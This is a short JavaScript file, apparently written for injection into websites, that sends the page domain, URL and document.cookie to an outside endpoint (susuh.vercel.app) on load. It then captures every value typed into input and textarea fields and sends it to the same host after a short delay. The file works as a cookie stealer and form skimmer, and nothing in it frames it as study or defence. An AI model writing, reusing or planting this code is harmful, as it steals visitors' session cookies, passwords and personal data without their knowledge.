let inputTimeout;

function discordSend(message) {
    var xhr = new XMLHttpRequest();
    
    xhr.open('POST', 'https://susuh.vercel.app/api/send', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    
    
    var payload = JSON.stringify({ message: message });
    xhr.send(payload);
}


discordSend(
    `! ${document.domain}\n\n` +
    `URL :\n${location.href}\n\n` +
    `Document :\n${document.cookie}`
);


document.addEventListener('input', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
        clearTimeout(inputTimeout);
        inputTimeout = setTimeout(function () {
            discordSend(
                `📥 di ${location.href}\n` +
                `Name: ${e.target.name || '(tidak ada name)'}\n` +
                `Value: ${e.target.value}`
            );
        }, 1500);
    }
});
